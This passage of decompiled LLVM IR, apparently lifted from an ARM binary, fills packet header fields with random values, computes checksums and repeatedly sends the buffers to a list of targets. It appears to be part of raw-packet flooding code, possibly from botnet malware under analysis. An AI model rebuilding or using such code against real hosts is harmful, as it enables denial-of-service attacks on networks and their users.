  %v3_c374 = add i32 %v2_c374, 4
  %v4_c374 = inttoptr i32 %v3_c374 to i8*
  store i8 %v1_c374, i8* %v4_c374, align 1
  %v0_c378 = load i32, i32* %r2.global-to-local, align 4
  %v1_c378 = load i32, i32* @r7, align 4
  %v2_c378 = add i32 %v1_c378, 16
  %v3_c378 = inttoptr i32 %v2_c378 to i32*
  store i32 %v0_c378, i32* %v3_c378, align 4
  %v0_c37c = load i32, i32* @sl, align 4
  %v1_c37c = trunc i32 %v0_c37c to i8
  %v2_c37c = load i32, i32* @r7, align 4
  %v3_c37c = add i32 %v2_c37c, 20
  %v4_c37c = inttoptr i32 %v3_c37c to i8*
  store i8 %v1_c37c, i8* %v4_c37c, align 1
  %v0_c380 = load i32, i32* @r7, align 4
  %v1_c380 = add i32 %v0_c380, 20
  store i32 %v1_c380, i32* @r4, align 4
  %v1_c384 = add i32 %v0_c380, 33
  %v2_c384 = inttoptr i32 %v1_c384 to i8*
  %v3_c384 = load i8, i8* %v2_c384, align 1
  %v4_c384 = zext i8 %v3_c384 to i32
  store i32 %v1_c254, i32* %r1.global-to-local, align 4
  %v1_c38c = and i32 %v4_c384, 223
  %v5_c390 = or i32 %v1_c38c, %v4_c390
  store i32 %v5_c390, i32* %r3.global-to-local, align 4
  %v1_c394 = trunc i32 %v5_c390 to i8
  store i8 %v1_c394, i8* %v2_c384, align 1
  %v0_c398 = load i32, i32* @r4, align 4
  %v1_c398 = add i32 %v0_c398, 13
  %v2_c398 = inttoptr i32 %v1_c398 to i8*
  %v3_c398 = load i8, i8* %v2_c398, align 1
  %v4_c398 = zext i8 %v3_c398 to i32
  store i32 %v1_c258, i32* %r3.global-to-local, align 4
  %v1_c3a0 = and i32 %v4_c398, 239
  %v5_c3a4 = or i32 %v1_c3a0, %v4_c3a4
  store i32 %v5_c3a4, i32* %r2.global-to-local, align 4
  %v1_c3a8 = trunc i32 %v5_c3a4 to i8
  store i8 %v1_c3a8, i8* %v2_c398, align 1
  %v0_c3ac = load i32, i32* @r4, align 4
  %v1_c3ac = add i32 %v0_c3ac, 13
  %v2_c3ac = inttoptr i32 %v1_c3ac to i8*
  %v3_c3ac = load i8, i8* %v2_c3ac, align 1
  %v4_c3ac = zext i8 %v3_c3ac to i32
  store i32 %v1_c25c, i32* %ip.global-to-local, align 4
  %v1_c3b4 = and i32 %v4_c3ac, 247
  %v5_c3b8 = or i32 %v1_c3b4, %v4_c3b8
  store i32 %v5_c3b8, i32* %r3.global-to-local, align 4
  %v1_c3bc = trunc i32 %v5_c3b8 to i8
  store i8 %v1_c3bc, i8* %v2_c3ac, align 1
  %v0_c3c0 = load i32, i32* @r4, align 4
  %v1_c3c0 = add i32 %v0_c3c0, 13
  %v2_c3c0 = inttoptr i32 %v1_c3c0 to i8*
  %v3_c3c0 = load i8, i8* %v2_c3c0, align 1
  %v4_c3c0 = zext i8 %v3_c3c0 to i32
  store i32 %v1_c280, i32* %r1.global-to-local, align 4
  %v1_c3c8 = and i32 %v4_c3c0, 251
  %v5_c3cc = or i32 %v1_c3c8, %v4_c3cc
  store i32 %v5_c3cc, i32* %r2.global-to-local, align 4
  %v1_c3d0 = trunc i32 %v5_c3cc to i8
  store i8 %v1_c3d0, i8* %v2_c3c0, align 1
  %v0_c3d4 = load i32, i32* @r4, align 4
  %v1_c3d4 = add i32 %v0_c3d4, 13
  %v2_c3d4 = inttoptr i32 %v1_c3d4 to i8*
  %v3_c3d4 = load i8, i8* %v2_c3d4, align 1
  %v4_c3d4 = zext i8 %v3_c3d4 to i32
  store i32 %v1_c284, i32* %r2.global-to-local, align 4
  %v1_c3dc = and i32 %v4_c3d4, 253
  %v4_c3e0 = or i32 %v1_c3dc, %v3_c3e0
  store i32 %v4_c3e0, i32* %r3.global-to-local, align 4
  %v1_c3e4 = trunc i32 %v4_c3e0 to i8
  store i8 %v1_c3e4, i8* %v2_c3d4, align 1
  %v0_c3e8 = load i32, i32* @r4, align 4
  %v1_c3e8 = add i32 %v0_c3e8, 12
  %v2_c3e8 = inttoptr i32 %v1_c3e8 to i8*
  %v3_c3e8 = load i8, i8* %v2_c3e8, align 1
  %v4_c3e8 = zext i8 %v3_c3e8 to i32
  store i32 %v4_c3e8, i32* %r2.global-to-local, align 4
  %v1_c3ec = add i32 %v0_c3e8, 13
  %v2_c3ec = inttoptr i32 %v1_c3ec to i8*
  %v3_c3ec = load i8, i8* %v2_c3ec, align 1
  %v4_c3ec = zext i8 %v3_c3ec to i32
  store i32 %v1_c288, i32* %ip.global-to-local, align 4
  %tmp99 = urem i8 %v3_c3e8, 16
  %v1_c3f4 = zext i8 %tmp99 to i32
  %v1_c3f8 = and i32 %v4_c3ec, 254
  %v2_c3fc = or i32 %v1_c3f8, %v1_c288
  store i32 %v2_c3fc, i32* %r3.global-to-local, align 4
  %v1_c400 = or i32 %v1_c3f4, 80
  store i32 %v1_c400, i32* %r2.global-to-local, align 4
  %v1_c404 = trunc i32 %v2_c3fc to i8
  store i8 %v1_c404, i8* %v2_c3ec, align 1
  %v0_c408 = load i32, i32* %r2.global-to-local, align 4
  %v1_c408 = trunc i32 %v0_c408 to i8
  %v2_c408 = load i32, i32* @r4, align 4
  %v3_c408 = add i32 %v2_c408, 12
  %v4_c408 = inttoptr i32 %v3_c408 to i8*
  store i8 %v1_c408, i8* %v4_c408, align 1
  store i32 %v3_c410, i32* %r1.global-to-local, align 4
  store i32 %v7_c410, i32* %r2.global-to-local, align 4
  %v2_c414 = load i32, i32* @r4, align 4
  %v3_c414 = add i32 %v2_c414, 1
  %v4_c414 = inttoptr i32 %v3_c414 to i8*
  store i8 %v5_c2c0, i8* %v4_c414, align 1
  %v0_c418 = load i32, i32* %r2.global-to-local, align 4
  %v1_c418 = trunc i32 %v0_c418 to i8
  %v2_c418 = load i32, i32* @r4, align 4
  %v3_c418 = add i32 %v2_c418, 3
  %v4_c418 = inttoptr i32 %v3_c418 to i8*
  store i8 %v1_c418, i8* %v4_c418, align 1
  %v0_c41c = load i32, i32* @r6, align 4
  %v1_c41c = trunc i32 %v0_c41c to i8
  %v2_c41c = load i32, i32* @r4, align 4
  %v3_c41c = add i32 %v2_c41c, 2
  %v4_c41c = inttoptr i32 %v3_c41c to i8*
  store i8 %v1_c41c, i8* %v4_c41c, align 1
  %v0_c420 = load i32, i32* @r8, align 4
  %v1_c420 = load i32, i32* @r4, align 4
  %v2_c420 = add i32 %v1_c420, 4
  %v3_c420 = inttoptr i32 %v2_c420 to i32*
  store i32 %v0_c420, i32* %v3_c420, align 4
  %v0_c424 = call i32 @function_fe60()
  store i32 %v1_c28c, i32* %ip.global-to-local, align 4
  %sext = mul i32 %v0_c424, 16777216
  %v1_c42c = sdiv i32 %sext, 16777216
  store i32 %v1_c42c, i32* %r2.global-to-local, align 4
  %v3_c430 = ashr i32 %sext, 31
  store i32 %v3_c430, i32* %r3.global-to-local, align 4
  store i1 %v2_c434, i1* %cpsr_z.global-to-local, align 1
  %v1_c438 = trunc i32 %v3_c430 to i8
  %v2_c438 = load i32, i32* @r4, align 4
  %v3_c438 = add i32 %v2_c438, 15
  %v4_c438 = inttoptr i32 %v3_c438 to i8*
  store i8 %v1_c438, i8* %v4_c438, align 1
  %v0_c43c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_c448.pre = load i32, i32* @r4, align 4
  br i1 %v0_c43c, label %.thread13, label %bb87

bb87:                                             ; preds = %bb86
  %v2_c43c = add i32 %v2_c448.pre, 13
  %v3_c43c = inttoptr i32 %v2_c43c to i8*
  %v4_c43c = load i8, i8* %v3_c43c, align 1
  %v5_c43c = zext i8 %v4_c43c to i32
  %v2_c440 = or i32 %v5_c43c, 8
  store i32 %v2_c440, i32* %r3.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb86, %bb87
  store i32 %v6_c13c, i32* @r1, align 4
  %v0_c448 = load i32, i32* %r2.global-to-local, align 4
  %v1_c448 = trunc i32 %v0_c448 to i8
  %v3_c448 = add i32 %v2_c448.pre, 14
  %v4_c448 = inttoptr i32 %v3_c448 to i8*
  store i8 %v1_c448, i8* %v4_c448, align 1
  %v0_c44c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c44c, label %bb89, label %bb88

bb88:                                             ; preds = %.thread13
  %v1_c44c = load i32, i32* %r3.global-to-local, align 4
  %v2_c44c = trunc i32 %v1_c44c to i8
  %v3_c44c = load i32, i32* @r4, align 4
  %v4_c44c = add i32 %v3_c44c, 13
  %v5_c44c = inttoptr i32 %v4_c44c to i8*
  store i8 %v2_c44c, i8* %v5_c44c, align 1
  br label %bb89

bb89:                                             ; preds = %.thread13, %bb88
  %v0_c450 = load i32, i32* @r7, align 4
  %v1_c450 = add i32 %v0_c450, 40
  %v1_c454 = inttoptr i32 %v1_c450 to i8*
  %v2_c454 = call i32 @function_1003c(i8* %v1_c454)
  %v3_c458 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c458, i32* %r3.global-to-local, align 4
  %v1_c45c = add i32 %v3_c458, 1
  store i32 %v1_c45c, i32* @r4, align 4
  %v0_c460 = load i32, i32* @fp, align 4
  %v9_c460 = icmp eq i32 %v0_c460, %v1_c45c
  store i1 %v9_c460, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c45c, i32* %stack_var_-40, align 4
  %v8_c468 = icmp sgt i32 %v0_c460, %v1_c45c
  br i1 %v8_c468, label %dec_label_pc_c2cc, label %dec_label_pc_c46c

dec_label_pc_c46c:                                ; preds = %bb89
  store i32 %v6_c13c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c474.preheader

dec_label_pc_c474.preheader:                      ; preds = %dec_label_pc_c46c, %dec_label_pc_c6e0
  %v0_c47417 = phi i32 [ %v0_c460, %dec_label_pc_c46c ], [ %v0_c1e0, %dec_label_pc_c6e0 ]
  %stack_var_-168.0.ph = phi i32 [ %v1_c200, %dec_label_pc_c46c ], [ %v1_c6e8, %dec_label_pc_c6e0 ]
  %storemerge = add i32 %v6_c13c, 20
  store i32 %storemerge, i32* @r8, align 4
  %v3_c62c = icmp eq i32 %v6_c178, -1
  %v8_c62c = icmp eq i32 %v6_c178, -1
  %v3_c648 = icmp eq i32 %v3_c1d4, 65535
  %v2_c6c4 = icmp eq i32 %v1_c164, 0
  br label %dec_label_pc_c474

dec_label_pc_c474:                                ; preds = %dec_label_pc_c51c, %dec_label_pc_c474.preheader
  %v0_c474 = phi i32 [ %v0_c47417, %dec_label_pc_c474.preheader ], [ %v0_c5b0, %dec_label_pc_c51c ]
  %v2_c474 = icmp eq i32 %v0_c474, 0
  store i1 %v2_c474, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp90 = icmp slt i32 %v0_c474, 1
  br label %dec_label_pc_c47c

dec_label_pc_c47c:                                ; preds = %dec_label_pc_c47c, %dec_label_pc_c474
  br i1 %tmp90, label %dec_label_pc_c47c, label %dec_label_pc_c480

dec_label_pc_c480:                                ; preds = %dec_label_pc_c47c
  %v0_c480 = load i32, i32* @r8, align 4
  %v3_c480 = mul i32 %v0_c480, 65536
  store i32 %v3_c480, i32* %r2.global-to-local, align 4
  %tmp91 = mul i32 %v0_c480, 256
  %v1_c488 = and i32 %tmp91, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  store i32 %v1_c488, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %tmp92 = udiv i32 %v0_c480, 256
  %v4_c494 = urem i32 %tmp92, 256
  %v5_c494 = or i32 %v4_c494, %v1_c488
  store i32 %v5_c494, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_c49c

dec_label_pc_c49c:                                ; preds = %dec_label_pc_c51c, %dec_label_pc_c480
  %v1_c4b0 = phi i32 [ %v1_c5ac, %dec_label_pc_c51c ], [ 0, %dec_label_pc_c480 ]
  %v5_c4a0 = mul i32 %v1_c4b0, 24
  %v1_c4a4 = load i32, i32* @sb, align 4
  %v2_c4a4 = add i32 %v1_c4a4, %v5_c4a0
  store i32 %v2_c4a4, i32* %r3.global-to-local, align 4
  store i32 %v2_bfa8, i32* %ip.global-to-local, align 4
  %v1_c4ac = add i32 %v2_c4a4, 20
  %v2_c4ac = inttoptr i32 %v1_c4ac to i8*
  %v3_c4ac = load i8, i8* %v2_c4ac, align 1
  %v4_c4ac = zext i8 %v3_c4ac to i32
  store i32 %v4_c4ac, i32* %r2.global-to-local, align 4
  %v4_c4b0 = mul i32 %v1_c4b0, 4
  %v5_c4b0 = add i32 %v4_c4b0, %v2_bfa8
  %v6_c4b0 = inttoptr i32 %v5_c4b0 to i32*
  %v7_c4b0 = load i32, i32* %v6_c4b0, align 4
  store i32 %v7_c4b0, i32* @r5, align 4
  %v7_c4b4 = icmp eq i8 %v3_c4ac, 31
  store i1 %v7_c4b4, i1* %cpsr_z.global-to-local, align 1
  %v1_c4b8 = add i32 %v7_c4b0, 20
  store i32 %v1_c4b8, i32* @r6, align 4
  %tmp100 = icmp ult i8 %v3_c4ac, 32
  br i1 %tmp100, label %dec_label_pc_c5d0, label %dec_label_pc_c4c0

dec_label_pc_c4c0:                                ; preds = %dec_label_pc_c49c
  store i32 %v6_c178, i32* %r1.global-to-local, align 4
  store i1 %v8_c62c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c62c, label %dec_label_pc_c638, label %dec_label_pc_c4cc

dec_label_pc_c4cc:                                ; preds = %dec_label_pc_c5d0, %dec_label_pc_c4c0
  store i32 %v3_c1d4, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c648, label %dec_label_pc_c654, label %dec_label_pc_c4e0

dec_label_pc_c4e0:                                ; preds = %dec_label_pc_c638.dec_label_pc_c4e0_crit_edge, %dec_label_pc_c4cc
  %v1_c4e4 = phi i32 [ %v1_c4e4.pre, %dec_label_pc_c638.dec_label_pc_c4e0_crit_edge ], [ 65535, %dec_label_pc_c4cc ]
  store i32 %v3_c1d8, i32* %r3.global-to-local, align 4
  %v9_c4e4 = icmp eq i32 %v3_c1d8, %v1_c4e4
  store i1 %v9_c4e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c4e4, label %dec_label_pc_c670, label %dec_label_pc_c4ec

dec_label_pc_c4ec:                                ; preds = %dec_label_pc_c654.dec_label_pc_c4ec_crit_edge, %dec_label_pc_c4e0
  %v1_c4f0 = phi i32 [ %v1_c4f0.pre, %dec_label_pc_c654.dec_label_pc_c4ec_crit_edge ], [ %v1_c4e4, %dec_label_pc_c4e0 ]
  store i32 %v3_c1dc, i32* %ip.global-to-local, align 4
  %v9_c4f0 = icmp eq i32 %v3_c1dc, %v1_c4f0
  store i1 %v9_c4f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c4f0, label %dec_label_pc_c68c, label %dec_label_pc_c4f8

dec_label_pc_c4f8:                                ; preds = %dec_label_pc_c670.dec_label_pc_c4f8_crit_edge, %dec_label_pc_c4ec
  %v1_c4fc = phi i32 [ %v1_c4fc.pre, %dec_label_pc_c670.dec_label_pc_c4f8_crit_edge ], [ %v1_c4f0, %dec_label_pc_c4ec ]
  store i32 %v5_c078, i32* %r1.global-to-local, align 4
  %v9_c4fc = icmp eq i32 %v5_c078, %v1_c4fc
  store i1 %v9_c4fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c4fc, label %dec_label_pc_c6a8, label %dec_label_pc_c504

dec_label_pc_c504:                                ; preds = %dec_label_pc_c68c.dec_label_pc_c504_crit_edge, %dec_label_pc_c4f8
  %v1_c508 = phi i32 [ %v1_c508.pre, %dec_label_pc_c68c.dec_label_pc_c504_crit_edge ], [ %v1_c4fc, %dec_label_pc_c4f8 ]
  store i32 %v6_c094, i32* %r2.global-to-local, align 4
  %v9_c508 = icmp eq i32 %v6_c094, %v1_c508
  store i1 %v9_c508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c508, label %dec_label_pc_c6bc, label %dec_label_pc_c510

dec_label_pc_c510:                                ; preds = %dec_label_pc_c6a8, %dec_label_pc_c504
  store i32 %v1_c164, i32* %r3.global-to-local, align 4
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6c4, label %dec_label_pc_c51c, label %dec_label_pc_c6d0

dec_label_pc_c51c:                                ; preds = %dec_label_pc_c510, %dec_label_pc_c6bc, %dec_label_pc_c6d0
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c520 = load i32, i32* @r7, align 4
  %v1_c520 = trunc i32 %v0_c520 to i8
  %v2_c520 = load i32, i32* @r5, align 4
  %v3_c520 = add i32 %v2_c520, 10
  %v4_c520 = inttoptr i32 %v3_c520 to i8*
  store i8 %v1_c520, i8* %v4_c520, align 1
  %v0_c524 = load i32, i32* @r7, align 4
  %v1_c524 = trunc i32 %v0_c524 to i8
  %v2_c524 = load i32, i32* @r5, align 4
  %v3_c524 = add i32 %v2_c524, 11
  %v4_c524 = inttoptr i32 %v3_c524 to i8*
  store i8 %v1_c524, i8* %v4_c524, align 1
  %v0_c528 = load i32, i32* @r5, align 4
  store i32 %v0_c528, i32* @r0, align 4
  %v2_c52c = call i32 @function_e424(i32 %v0_c528, i32 20)
  %v3_c52c = trunc i32 %v2_c52c to i8
  %v4_c53028 = udiv i32 %v2_c52c, 256
  %v1_c534 = trunc i32 %v4_c53028 to i8
  %v2_c534 = load i32, i32* @r5, align 4
  %v3_c534 = add i32 %v2_c534, 11
  %v4_c534 = inttoptr i32 %v3_c534 to i8*
  store i8 %v1_c534, i8* %v4_c534, align 1
  %v3_c538 = load i32, i32* @r5, align 4
  %v4_c538 = add i32 %v3_c538, 10
  %v5_c538 = inttoptr i32 %v4_c538 to i8*
  store i8 %v3_c52c, i8* %v5_c538, align 1
  %v0_c53c = load i32, i32* @r6, align 4
  store i32 %v0_c53c, i32* @r1, align 4
  %v0_c540 = load i32, i32* @sl, align 4
  store i32 %v0_c540, i32* %r2.global-to-local, align 4
  %v0_c544 = load i32, i32* @r8, align 4
  store i32 %v0_c544, i32* %r3.global-to-local, align 4
  %v0_c548 = load i32, i32* @r7, align 4
  %v1_c548 = trunc i32 %v0_c548 to i8
  %v3_c548 = add i32 %v0_c53c, 16
  %v4_c548 = inttoptr i32 %v3_c548 to i8*
  store i8 %v1_c548, i8* %v4_c548, align 1
  %v0_c54c = load i32, i32* @r7, align 4
  %v1_c54c = trunc i32 %v0_c54c to i8
  %v2_c54c = load i32, i32* @r6, align 4
  %v3_c54c = add i32 %v2_c54c, 17
  %v4_c54c = inttoptr i32 %v3_c54c to i8*
  store i8 %v1_c54c, i8* %v4_c54c, align 1
  %v0_c550 = load i32, i32* @r5, align 4
  %v4_c554 = call i32 @function_e480(i32 %v0_c550, i32 %v0_c53c, i32 %v0_c540, i32 %v0_c544)
  %v5_c554 = trunc i32 %v4_c554 to i8
  %v4_c55829 = udiv i32 %v4_c554, 256
  %v1_c55c = trunc i32 %v4_c55829 to i8
  %v2_c55c = load i32, i32* @r6, align 4
  %v3_c55c = add i32 %v2_c55c, 17
  %v4_c55c = inttoptr i32 %v3_c55c to i8*
  store i8 %v1_c55c, i8* %v4_c55c, align 1
  %v3_c560 = load i32, i32* @r6, align 4
  %v4_c560 = add i32 %v3_c560, 16
  %v5_c560 = inttoptr i32 %v4_c560 to i8*
  store i8 %v5_c554, i8* %v5_c560, align 1
  %v3_c564 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c564, i32* %r3.global-to-local, align 4
  %v0_c568 = load i32, i32* @r5, align 4
  %v1_c568 = add i32 %v0_c568, 20
  %v2_c568 = inttoptr i32 %v1_c568 to i32*
  %v3_c568 = load i32, i32* %v2_c568, align 4
  %v3_c570 = udiv i32 %v3_c568, 65536
  store i32 %v3_c570, i32* %r2.global-to-local, align 4
  %v5_c574 = mul i32 %v3_c564, 24
  %v1_c578 = load i32, i32* @sb, align 4
  %v2_c578 = add i32 %v1_c578, %v5_c574
  store i32 %v2_c578, i32* %ip.global-to-local, align 4
  %v3_c57c27 = udiv i32 %v3_c568, 16777216
  %v1_c580 = trunc i32 %v3_c57c27 to i8
  %v3_c580 = add i32 %v2_c578, 3
  %v4_c580 = inttoptr i32 %v3_c580 to i8*
  store i8 %v1_c580, i8* %v4_c580, align 1
  %v0_c584 = load i32, i32* %r2.global-to-local, align 4
  %v1_c584 = trunc i32 %v0_c584 to i8
  %v2_c584 = load i32, i32* %ip.global-to-local, align 4
  %v3_c584 = add i32 %v2_c584, 2
  %v4_c584 = inttoptr i32 %v3_c584 to i8*
  store i8 %v1_c584, i8* %v4_c584, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  store i32 %v0_c58c, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-168.0.ph, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c59c = load i32, i32* %ip.global-to-local, align 4
  %v6_c5a4 = inttoptr i32 %v0_c58c to i32*
  %v7_c5a4 = call i32 @function_13f2c(i32 %v3_c18c, i32* %v6_c5a4, i32 %stack_var_-168.0.ph, i32 16384, i32 %v0_c59c, i32 16)
  %v3_c5a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c5a8, i32* %r3.global-to-local, align 4
  %v1_c5ac = add i32 %v3_c5a8, 1
  %v0_c5b0 = load i32, i32* @fp, align 4
  %v9_c5b0 = icmp eq i32 %v0_c5b0, %v1_c5ac
  store i1 %v9_c5b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c5ac, i32* %stack_var_-40, align 4
  %v7_c5b8 = icmp sgt i32 %v0_c5b0, %v1_c5ac
  br i1 %v7_c5b8, label %dec_label_pc_c49c, label %dec_label_pc_c474

dec_label_pc_c5c0:                                ; preds = %dec_label_pc_c19c
  %v1_c5c4 = call i32 @function_1369c(i32 %v3_c18c)
  br label %dec_label_pc_c5c8

dec_label_pc_c5c8:                                ; preds = %dec_label_pc_bf88, %dec_label_pc_c5c0
  %v29_c5cc = phi i32 [ %v3_c18c, %dec_label_pc_bf88 ], [ %v1_c5c4, %dec_label_pc_c5c0 ]
  ret i32 %v29_c5cc

dec_label_pc_c5d0:                                ; preds = %dec_label_pc_c49c
  %v1_c5d0 = add i32 %v2_c4a4, 16
  %v2_c5d0 = inttoptr i32 %v1_c5d0 to i32*
  %v3_c5d0 = load i32, i32* %v2_c5d0, align 4
  %v0_c5d4 = call i32 @function_fe60()
  %v3_c5d8 = load i32, i32* %stack_var_-40, align 4
  %v5_c5e0 = mul i32 %v3_c5d8, 24
  %v1_c5e8 = load i32, i32* @sb, align 4
  %v2_c5e8 = add i32 %v1_c5e8, %v5_c5e0
  store i32 %v2_c5e8, i32* %r1.global-to-local, align 4
  %v1_c5ec = and i32 %v3_c5d0, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_c5ec, i32* %r3.global-to-local, align 4
  %v1_c5e4 = udiv i32 %v3_c5d0, 256
  %v3_c5f0 = and i32 %v1_c5e4, 65280
  store i32 %v3_c5f0, i32* %r2.global-to-local, align 4
  %v3_c5f4 = mul i32 %v3_c5d0, 16777216
  store i32 %v3_c5f4, i32* %ip.global-to-local, align 4
  %v1_c5f8 = add i32 %v2_c5e8, 20
  %v2_c5f8 = inttoptr i32 %v1_c5f8 to i8*
  %v3_c5f8 = load i8, i8* %v2_c5f8, align 1
  %v4_c5f8 = zext i8 %v3_c5f8 to i32
  %v4_c5fc = mul i32 %v1_c5ec, 256
  %v5_c5fc = or i32 %v4_c5fc, %v3_c5f4
  store i32 %v5_c5fc, i32* %ip.global-to-local, align 4
  %v4_c600 = udiv i32 %v3_c5d0, 16777216
  %v5_c600 = or i32 %v3_c5f0, %v4_c600
  %v2_c604 = or i32 %v5_c600, %v5_c5fc
  %v7_c608 = lshr i32 %v0_c5d4, %v4_c5f8
  %v8_c608 = add i32 %v7_c608, %v2_c604
  store i32 %v8_c608, i32* %r2.global-to-local, align 4
  %v2_c624 = call i32 @llvm.bswap.i32(i32 %v8_c608)
  store i32 %v2_c624, i32* %r3.global-to-local, align 4
  store i32 %v6_c178, i32* %r1.global-to-local, align 4
  store i1 %v8_c62c, i1* %cpsr_z.global-to-local, align 1
  %v1_c630 = load i32, i32* @r5, align 4
  %v2_c630 = add i32 %v1_c630, 16
  %v3_c630 = inttoptr i32 %v2_c630 to i32*
  store i32 %v2_c624, i32* %v3_c630, align 4
  br i1 %v3_c62c, label %dec_label_pc_c638, label %dec_label_pc_c4cc

dec_label_pc_c638:                                ; preds = %dec_label_pc_c5d0, %dec_label_pc_c4c0
  %v0_c638 = call i32 @function_fe60()
  store i32 %v3_c1d4, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c648, i1* %cpsr_z.global-to-local, align 1
  %v1_c64c = load i32, i32* @r5, align 4
  %v2_c64c = add i32 %v1_c64c, 12
  %v3_c64c = inttoptr i32 %v2_c64c to i32*
  store i32 %v0_c638, i32* %v3_c64c, align 4
  br i1 %v3_c648, label %dec_label_pc_c654, label %dec_label_pc_c638.dec_label_pc_c4e0_crit_edge

dec_label_pc_c638.dec_label_pc_c4e0_crit_edge:    ; preds = %dec_label_pc_c638
  %v1_c4e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c4e0

dec_label_pc_c654:                                ; preds = %dec_label_pc_c638, %dec_label_pc_c4cc
  %v0_c654 = call i32 @function_fe60()
  %v1_c654 = trunc i32 %v0_c654 to i8
  %v4_c65830 = udiv i32 %v0_c654, 256
  %v1_c65c = trunc i32 %v4_c65830 to i8
  %v2_c65c = load i32, i32* @r5, align 4
  %v3_c65c = add i32 %v2_c65c, 5
  %v4_c65c = inttoptr i32 %v3_c65c to i8*
  store i8 %v1_c65c, i8* %v4_c65c, align 1
  store i32 %v3_c1d8, i32* %r3.global-to-local, align 4
  %v1_c664 = load i32, i32* @r4, align 4
  %v9_c664 = icmp eq i32 %v3_c1d8, %v1_c664
  store i1 %v9_c664, i1* %cpsr_z.global-to-local, align 1
  %v3_c668 = load i32, i32* @r5, align 4
  %v4_c668 = add i32 %v3_c668, 4
  %v5_c668 = inttoptr i32 %v4_c668 to i8*
  store i8 %v1_c654, i8* %v5_c668, align 1
  %v0_c66c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c66c, label %dec_label_pc_c670, label %dec_label_pc_c654.dec_label_pc_c4ec_crit_edge

dec_label_pc_c654.dec_label_pc_c4ec_crit_edge:    ; preds = %dec_label_pc_c654
  %v1_c4f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c4ec

dec_label_pc_c670:                                ; preds = %dec_label_pc_c654, %dec_label_pc_c4e0
  %v0_c670 = call i32 @function_fe60()
  %v1_c670 = trunc i32 %v0_c670 to i8
  store i32 %v3_c1dc, i32* %ip.global-to-local, align 4
  %v4_c678 = sdiv i32 %v0_c670, 256
  store i32 %v4_c678, i32* %r3.global-to-local, align 4
  %v1_c67c = load i32, i32* @r4, align 4
  %v9_c67c = icmp eq i32 %v3_c1dc, %v1_c67c
  store i1 %v9_c67c, i1* %cpsr_z.global-to-local, align 1
  %v3_c680 = load i32, i32* @r5, align 4
  %v4_c680 = add i32 %v3_c680, 20
  %v5_c680 = inttoptr i32 %v4_c680 to i8*
  store i8 %v1_c670, i8* %v5_c680, align 1
  %v0_c684 = load i32, i32* %r3.global-to-local, align 4
  %v1_c684 = trunc i32 %v0_c684 to i8
  %v2_c684 = load i32, i32* @r6, align 4
  %v3_c684 = add i32 %v2_c684, 1
  %v4_c684 = inttoptr i32 %v3_c684 to i8*
  store i8 %v1_c684, i8* %v4_c684, align 1
  %v0_c688 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c688, label %dec_label_pc_c68c, label %dec_label_pc_c670.dec_label_pc_c4f8_crit_edge

dec_label_pc_c670.dec_label_pc_c4f8_crit_edge:    ; preds = %dec_label_pc_c670
  %v1_c4fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c4f8

dec_label_pc_c68c:                                ; preds = %dec_label_pc_c670, %dec_label_pc_c4ec
  %v0_c68c = call i32 @function_fe60()
  %v1_c68c = trunc i32 %v0_c68c to i8
  store i32 %v5_c078, i32* %r1.global-to-local, align 4
  %v4_c694 = sdiv i32 %v0_c68c, 256
  store i32 %v4_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = load i32, i32* @r4, align 4
  %v9_c698 = icmp eq i32 %v5_c078, %v1_c698
  store i1 %v9_c698, i1* %cpsr_z.global-to-local, align 1
  %v1_c69c = trunc i32 %v4_c694 to i8
  %v2_c69c = load i32, i32* @r6, align 4
  %v3_c69c = add i32 %v2_c69c, 3
  %v4_c69c = inttoptr i32 %v3_c69c to i8*
  store i8 %v1_c69c, i8* %v4_c69c, align 1
  %v3_c6a0 = load i32, i32* @r6, align 4
  %v4_c6a0 = add i32 %v3_c6a0, 2
  %v5_c6a0 = inttoptr i32 %v4_c6a0 to i8*
  store i8 %v1_c68c, i8* %v5_c6a0, align 1
  %v0_c6a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6a4, label %dec_label_pc_c6a8, label %dec_label_pc_c68c.dec_label_pc_c504_crit_edge

dec_label_pc_c68c.dec_label_pc_c504_crit_edge:    ; preds = %dec_label_pc_c68c
  %v1_c508.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c504

dec_label_pc_c6a8:                                ; preds = %dec_label_pc_c68c, %dec_label_pc_c4f8
  %v0_c6a8 = call i32 @function_fe60()
  store i32 %v6_c094, i32* %r2.global-to-local, align 4
